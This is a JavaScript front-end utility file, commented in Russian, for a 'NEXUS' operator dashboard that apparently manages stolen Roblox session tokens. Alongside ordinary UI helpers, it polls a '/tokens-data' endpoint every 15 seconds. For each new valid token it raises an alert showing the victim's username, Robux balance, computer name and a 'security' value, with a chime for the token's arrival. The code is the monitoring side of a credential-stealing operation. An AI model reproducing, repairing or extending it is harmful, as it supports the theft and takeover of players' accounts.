// ── Общие утилиты для статического сайта ──────────────────────────────────────
const IMG = ["jpg","jpeg","png","gif","webp","bmp","svg","avif"];
const VID = ["mp4","webm","mov","avi"];
const AUD = ["mp3","wav","flac","ogg","m4a"];
const TXT = ["txt","md","js","ts","html","css","cs","py","json","cpp","c","java"];

// Системные файлы, которые нужно скрывать из списка
const HIDDEN_FILES = ["settings.json","_metadata.json","metadata.json",".gitkeep",".DS_Store","thumbs.db"];

function ext(n) { return n.split(".").pop().toLowerCase(); }
function isImg(n) { return IMG.includes(ext(n)); }
function isText(n) { return TXT.includes(ext(n)); }
function isVid(n) { return VID.includes(ext(n)); }
function isAud(n) { return AUD.includes(ext(n)); }
function isHiddenFile(n) { return HIDDEN_FILES.includes(n.toLowerCase()); }

function icon(n) {
  const e = ext(n);
  if (isImg(n)) {
    return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>`;
  }
  if (isVid(n)) {
    return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>`;
  }
  if (isAud(n)) {
    return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"></path><circle cx="6" cy="18" r="3"></circle><circle cx="18" cy="16" r="3"></circle></svg>`;
  }
  if (e === "pdf" || isText(n)) {
    return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>`;
  }
  if (["zip","rar","7z"].includes(e)) {
    return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="21 8 21 21 3 21 3 8"></polyline><rect x="1" y="3" width="22" height="5"></rect><line x1="10" y1="12" x2="14" y2="12"></line></svg>`;
  }
  return `<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>`;
}

function fmtSize(b) {
  if (b < 1024) return b + " B";
  if (b < 1048576) return (b / 1024).toFixed(1) + " KB";
  return (b / 1048576).toFixed(1) + " MB";
}

function fmtDate(s) {
  if (!s) return "—";
  return new Date(s).toLocaleString("ru", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

// ── Auth (token в localStorage) ───────────────────────────────────────────────
function getToken() { return localStorage.getItem('ft_token') || ''; }
function getUser()  { return localStorage.getItem('ft_user')  || ''; }
function setAuth(token, user) {
  localStorage.setItem('ft_token', token);
  localStorage.setItem('ft_user', user);
}
function clearAuth() {
  localStorage.removeItem('ft_token');
  localStorage.removeItem('ft_user');
}

// Редирект на логин, если нет токена
function requireLogin() {
  if (!getToken()) {
    location.href = 'login.html';
    return false;
  }
  return true;
}

// fetch с подставленным API_BASE и Authorization-заголовком
async function apiFetch(path, opts = {}) {
  opts.headers = opts.headers || {};
  const token = getToken();
  if (token) opts.headers['Authorization'] = 'Bearer ' + token;

  try {
    const resp = await fetch(API_BASE + path, opts);

    if (resp.status === 401 || resp.status === 403) {
      clearAuth();
      location.href = 'login.html';
      throw new Error('auth');
    }
    return resp;
  } catch (err) {
    if (err.message === 'auth') throw err;
    throw err;
  }
}

function assetUrl(path) { return API_BASE + path; }

// ── UI-помощники ──────────────────────────────────────────────────────────────
function toast(msg, type = "ok") {
  const t = document.getElementById("toast");
  if (!t) return;
  t.textContent = msg;
  t.className = "show " + type;
  setTimeout(function() { t.className = ""; }, 3000);
}

// ── Звуковой синтезатор уведомлений ──────────────────────────────────────────
function playNotificationSound() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    if (ctx.state === 'suspended') {
      ctx.resume();
    }
    const now = ctx.currentTime;

    // Мелодичный 3-тональный перезвон прибытия токена (E5 -> G#5 -> B5 -> E6)
    const freqs = [659.25, 830.61, 987.77, 1318.51];
    freqs.forEach((freq, idx) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      
      osc.type = 'sine';
      osc.frequency.setValueAtTime(freq, now + idx * 0.07);

      gain.gain.setValueAtTime(0.001, now + idx * 0.07);
      gain.gain.exponentialRampToValueAtTime(0.18, now + idx * 0.07 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.0001, now + idx * 0.07 + 0.45);

      osc.connect(gain);
      gain.connect(ctx.destination);

      osc.start(now + idx * 0.07);
      osc.stop(now + idx * 0.07 + 0.5);
    });
  } catch (e) {
    console.warn('Audio chime error:', e);
  }
}

// ── Форматирование статуса посещения аккаунта ─────────────────────────────────
function formatAccountLoginStatus(lastLoginTs) {
  if (!lastLoginTs) return { isNew: true, text: 'Новый аккаунт' };
  const ts = typeof lastLoginTs === 'string' ? parseInt(lastLoginTs) : Number(lastLoginTs);
  if (isNaN(ts) || ts <= 0) return { isNew: true, text: 'Новый аккаунт' };

  const loginDate = new Date(ts);
  const now = new Date();
  const diffMs = now - loginDate;
  const diffDays = Math.max(0, Math.floor(diffMs / (1000 * 60 * 60 * 24)));

  const dateStr = loginDate.toLocaleDateString('ru-RU', { day: 'numeric', month: 'short' });
  const timeStr = loginDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

  if (diffDays === 0) {
    return { isNew: false, text: `Был вход сегодня в ${timeStr}`, dateStr };
  } else if (diffDays === 1) {
    return { isNew: false, text: `Был вход вчера в ${timeStr}`, dateStr };
  } else if (diffDays < 30) {
    return { isNew: false, text: `Был вход: ${dateStr} (${diffDays} дн. назад)`, dateStr };
  } else {
    const diffMonths = Math.floor(diffDays / 30);
    return { isNew: false, text: `Был вход: ${dateStr} (~${diffMonths} мес. назад)`, dateStr };
  }
}

// ── Сохранение уведомления в локальную историю ───────────────────────────────
function saveNotificationToHistory(info) {
  try {
    const history = JSON.parse(localStorage.getItem('ft_notifications_history') || '[]');
    const statusInfo = formatAccountLoginStatus(info.lastLogin);
    
    const record = {
      id: info.id || ('notif_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6)),
      username: info.username || 'Roblox User',
      userId: info.userId || null,
      robux: Number(info.robux) || 0,
      computer: info.computer || 'Unknown PC',
      security: info.security || null,
      file: info.file || null,
      lastLogin: info.lastLogin || null,
      isNew: statusInfo.isNew,
      statusText: statusInfo.text,
      receivedAt: Date.now()
    };

    const isDuplicate = history.some(h => 
      (h.username === record.username || (h.userId && h.userId === record.userId)) 
      && Math.abs(h.receivedAt - record.receivedAt) < 30000
    );

    if (!isDuplicate) {
      history.unshift(record);
      if (history.length > 200) history.pop();
      localStorage.setItem('ft_notifications_history', JSON.stringify(history));
    }
  } catch (e) {}
}

function getUnreadNotificationsCount() {
  try {
    const history = JSON.parse(localStorage.getItem('ft_notifications_history') || '[]');
    const lastRead = parseInt(localStorage.getItem('ft_last_read_notif_time') || '0');
    return history.filter(n => (n.receivedAt || 0) > lastRead).length;
  } catch (e) {
    return 0;
  }
}

// ── Визуальное уведомление о токене ───────────────────────────────────────────
function showTokenNotification(info) {
  if (!info) return;
  playNotificationSound();
  saveNotificationToHistory(info);

  const notifBadge = document.getElementById('sidebarNotifBadge');
  if (notifBadge) {
    const unread = getUnreadNotificationsCount();
    if (unread > 0) {
      notifBadge.textContent = unread > 99 ? '99+' : unread;
      notifBadge.style.display = 'inline-flex';
    }
  }

  let container = document.getElementById('tokenNotificationContainer');
  if (!container) {
    container = document.createElement('div');
    container.id = 'tokenNotificationContainer';
    container.className = 'token-notification-container';
    document.body.appendChild(container);
  }

  const el = document.createElement('div');
  el.className = 'token-notification-card';
  
  const username = escapeHtml(info.username || 'Roblox User');
  const robuxNum = Number(info.robux) || 0;
  const robuxStr = robuxNum > 0 ? robuxNum.toLocaleString() + ' R$' : '0 R$';
  const computer = escapeHtml(info.computer || 'Unknown PC');
  
  const statusInfo = formatAccountLoginStatus(info.lastLogin);
  const badgeClass = statusInfo.isNew ? 'token-notif-badge-new' : 'token-notif-badge-old';

  let avatarHtml = `<div class="token-notif-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>`;
  if (info.userId) {
    avatarHtml = `<div class="token-notif-avatar"><img src="${API_BASE}/avatar-proxy/${info.userId}" onerror="this.outerHTML='<div class=\\'token-notif-avatar\\'>O</div>'"></div>`;
  }

  el.innerHTML = `
    <button class="token-notif-close" onclick="this.parentElement.remove()">✕</button>
    <div class="token-notif-header">
      <span class="token-notif-dot ${statusInfo.isNew ? '' : 'is-old'}"></span>
      <span class="token-notif-title">Roblox токен</span>
      <span class="${badgeClass}">${escapeHtml(statusInfo.text)}</span>
    </div>
    <div class="token-notif-body">
      ${avatarHtml}
      <div class="token-notif-info">
        <div class="token-notif-user">${username}</div>
        <div class="token-notif-pc">ПК: ${computer}</div>
      </div>
      <div class="token-notif-robux">${robuxStr}</div>
    </div>
  `;

  container.appendChild(el);

  // Системное уведомление браузера
  if ("Notification" in window && Notification.permission === "granted") {
    try {
      const title = statusInfo.isNew ? `Новый аккаунт Roblox: ${username}` : `Roblox аккаунт (${statusInfo.text}): ${username}`;
      new Notification(title, {
        body: `Баланс: ${robuxStr} | ПК: ${computer}\nСтатус: ${statusInfo.text}`,
        icon: info.userId ? `${API_BASE}/avatar-proxy/${info.userId}` : undefined
      });
    } catch (e) {}
  }

  setTimeout(() => {
    if (el.parentElement) {
      el.style.opacity = '0';
      el.style.transform = 'translateX(60px)';
      setTimeout(() => el.remove(), 300);
    }
  }, 7000);
}

// ── Фоновый слушатель новых токенов ──────────────────────────────────────────
let lastKnownTokenIds = new Set();
let isFirstTokenLoad = true;

async function checkNewTokensBackground() {
  if (!getToken()) return;
  try {
    const resp = await apiFetch('/tokens-data');
    if (!resp.ok) return;
    const tokens = await resp.json();
    if (!Array.isArray(tokens)) return;

    if (isFirstTokenLoad) {
      tokens.forEach(t => {
        const id = t.file || t.userId || t.security;
        if (id) lastKnownTokenIds.add(id);
      });
      isFirstTokenLoad = false;
      return;
    }

    tokens.forEach(t => {
      const id = t.file || t.userId || t.security;
      if (id && !lastKnownTokenIds.has(id)) {
        lastKnownTokenIds.add(id);
        if (t.valid) {
          const lastLogin = t.lastLogin 
            || (t.file ? localStorage.getItem('login_' + t.file) : null)
            || (t.userId ? localStorage.getItem('login_user_' + t.userId) : null)
            || (t.username ? localStorage.getItem('login_user_' + t.username.toLowerCase()) : null);

          showTokenNotification({
            username: t.username || t.user,
            userId: t.userId,
            robux: t.robux,
            computer: t.computer,
            file: t.file,
            security: t.security,
            lastLogin: lastLogin
          });
        }
      }
    });
  } catch (e) {}
}

// Фоновый таймер проверки новых токенов каждые 15 сек
if (getToken()) {
  setInterval(checkNewTokensBackground, 15000);
  setTimeout(checkNewTokensBackground, 2000);
}

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

// ── Аватарка оператора (без смайликов) ─────────────────────────────────────────
function operatorAvatarHTML(user) {
  const avatarImage = localStorage.getItem('ft_avatarImage');
  if (avatarImage) {
    return '<img src="' + avatarImage + '" alt="avatar">';
  }
  const u = (user || 'O').trim().toUpperCase();
  return escapeHtml(u.charAt(0));
}

// Отображаемое имя
function operatorDisplayName(user) {
  const custom = localStorage.getItem('ft_displayName');
  if (custom) return custom;
  return user || 'Operator';
}

// ── Акцентный цвет — глобальное применение ────────────────────────────────────
function applyAccentColor(color) {
  if (!color) color = localStorage.getItem('ft_themeColor') || '#38bdf8';
  const root = document.documentElement;
  root.style.setProperty('--accent', color);

  if (color.startsWith('#') && color.length === 7) {
    const r = parseInt(color.slice(1, 3), 16);
    const g = parseInt(color.slice(3, 5), 16);
    const b = parseInt(color.slice(5, 7), 16);
    root.style.setProperty('--accent-soft', 'rgba(' + r + ',' + g + ',' + b + ', 0.1)');
    root.style.setProperty('--accent-hover', 'rgba(' + r + ',' + g + ',' + b + ', 0.18)');
  }

  localStorage.setItem('ft_themeColor', color);
}

applyAccentColor();

function renderHeader(activePage) {
  const user = getUser();
  const avatarHtml = operatorAvatarHTML(user);
  const name = operatorDisplayName(user);

  if (activePage === 'notifications') {
    localStorage.setItem('ft_last_read_notif_time', String(Date.now()));
  }
  const unread = activePage === 'notifications' ? 0 : getUnreadNotificationsCount();
  const notifBadgeHtml = unread > 0 
    ? `<span class="nav-badge-count" id="sidebarNotifBadge">${unread > 99 ? '99+' : unread}</span>` 
    : `<span class="nav-badge-count" id="sidebarNotifBadge" style="display:none;">0</span>`;

  function navLink(page, href, iconSvg, label, extraClass = '', badgeHtml = '') {
    const cls = activePage === page ? 'nav-link active ' + extraClass : 'nav-link ' + extraClass;
    return `<a href="${href}" class="${cls.trim()}">
      <div class="nav-icon">${iconSvg}</div>
      <span class="nav-label">${label}</span>
      ${badgeHtml}
    </a>`;
  }

  const iconDashboard = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg>`;
  const iconTokens = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>`;
  const iconBell = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>`;
  const iconChat = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>`;
  const iconUpdates = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>`;
  const iconSettings = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>`;

  return `<aside class="sidebar">
    <a href="index.html" class="logo">
      <span class="logo-text">NEXUS</span>
    </a>
    <div class="nav-links">
      ${navLink('files', 'index.html', iconDashboard, 'Файлы')}
      ${navLink('tokens', 'tokens.html', iconTokens, 'Токены')}
      ${navLink('notifications', 'notifications.html', iconBell, 'Уведомления', '', notifBadgeHtml)}
      ${navLink('chat', 'chat.html', iconChat, 'Чат')}
      ${navLink('updates', 'updates.html', iconUpdates, 'Обновления')}
      ${navLink('settings', 'settings.html', iconSettings, 'Настройки', 'desktop-only')}
      
      <!-- Mobile only Profile Link -->
      <a href="settings.html" class="nav-link mobile-profile-link ${activePage === 'settings' ? 'active' : ''}">
        <div class="nav-icon user-avatar" style="width: 24px; height: 24px; font-size: 0.75rem;">${avatarHtml}</div>
        <span class="nav-label">Профиль</span>
      </a>
    </div>
    
    <div class="sidebar-spacer" style="flex: 1;"></div>

    <div class="user-badge desktop-only">
      <span class="user-avatar">${avatarHtml}</span>
      <div class="user-info">
        <span class="user-name">${escapeHtml(name)}</span>
        <button class="btn-logout" id="btnLogout">Выйти</button>
      </div>
    </div>
  </aside>`;
}

async function bindLogout() {
  const btn = document.getElementById('btnLogout');
  if (!btn) return;
  btn.addEventListener('click', async function(e) {
    e.preventDefault();
    try { await apiFetch('/api/logout', { method: 'POST' }); } catch (_) {}
    clearAuth();
    localStorage.removeItem('ft_remember');
    localStorage.removeItem('ft_savedUser');
    localStorage.removeItem('ft_savedPass');
    location.href = 'login.html';
  });
}
